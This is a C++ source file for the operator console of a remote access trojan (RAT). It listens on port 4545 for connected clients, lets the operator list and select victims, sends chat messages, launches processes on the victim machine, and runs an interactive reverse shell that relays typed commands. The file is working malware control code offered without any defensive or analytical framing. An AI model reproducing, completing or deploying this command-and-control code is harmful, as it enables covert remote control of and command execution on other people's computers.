#include <iostream>

#include "Trace.h"
#include "Entrypoint.h"
#include "ICommunicationFactory.h"
#include "IRatManager.h"

Entrypoint::Entrypoint()
	:
	_factory(CreateFactory()),
	_manager(
		CreateRatManager(
			_factory.get(),
			_factory->CreateWinSockConnectionListener(4545)))
{
	Startup();

	while (true)
	{
		ParseInput();

		if (_commands.contains(_command))
		{
			try
			{
				_commands[_command]();
			}
			catch(const std::exception& e)
			{
				Trace("Failed to execute command.\n%s\n", e.what());
			}
		}
		else
		{
			Trace("Command unknown\n");
		}

		Trace("\n> ");
	}
}

void Entrypoint::Startup()
{
	_commands["c"] = [this] { SendChatMessage(); };
	_commands["chat"] = [this] { SendChatMessage(); };

	_commands["p"] = [this] { SendCreateProcess(); };
	_commands["process"] = [this] { SendCreateProcess(); };

	_commands["r"] = [this] { SendReverseShell(); };
	_commands["reverse"] = [this] { SendReverseShell(); };

	_commands["l"] = [this] { ListClients(); };
	_commands["list"] = [this] { ListClients(); };

	_commands["s"] = [this] { SelectClient(); };
	_commands["select"] = [this] { SelectClient(); };

	Trace("> ");
}

void Entrypoint::SendChatMessage() const
{
	ValidateSelection();

	int result = _manager->Send(
		*_client,
		MessageType::Chat,
		_argsSpan);
}

void Entrypoint::SendCreateProcess() const
{
	ValidateSelection();

	int result = _manager->Send(
		*_client,
		MessageType::CreateProcessS,
		_argsSpan);
}

void Entrypoint::SendReverseShell()
{
	ValidateSelection();

	int result = _manager->Send(
		*_client,
		MessageType::StartReverseShell,
		_argsSpan);

	while (true)
	{
		ParseInput();

		if (_command == "exit")
		{
			result = _manager->Send(
				*_client,
				MessageType::StopReverseShell,
				_commandSpan);
			break;
		}

		result = _manager->Send(
			*_client,
			MessageType::ReverseShellMessage,
			_commandSpan);
	}
}

void Entrypoint::ListClients() const
{
	int i = 0;
	for (const auto& clientPipe : _manager->GetClients())
	{
		Trace("Client %d: %s\n", i, clientPipe->GetConnection()->GetAddress().c_str());
		i++;
	}
}

void Entrypoint::SelectClient()
{
	if (_args.empty())
	{
		if (_client == nullptr)
		{
			throw std::runtime_error("Supply client to select!");
		}
	}
	else
	{
		_client = std::make_unique<int>(std::stoi(_args));
	}

	const auto clientPipe = _manager->GetClients()[*_client];

	Trace("Selected client %d: %s\n", *_client, clientPipe->GetConnection()->GetAddress().c_str());
}

void Entrypoint::ParseInput()
{
	std::string input;
	std::getline(std::cin, input);

	const int pos = input.find(' ');

	_command = input.substr(0, pos);
	_commandSpan = std::span(const_cast<char*>(_command.c_str()), _command.size());

	pos == -1
		? _args = ""
		: _args = input.substr(pos + 1);

	_argsSpan = std::span(const_cast<char*>(_args.c_str()), _args.size());
}

void Entrypoint::ValidateSelection() const
{
	if (_client == nullptr)
	{
		throw std::runtime_error("No client selected!");
	}
}
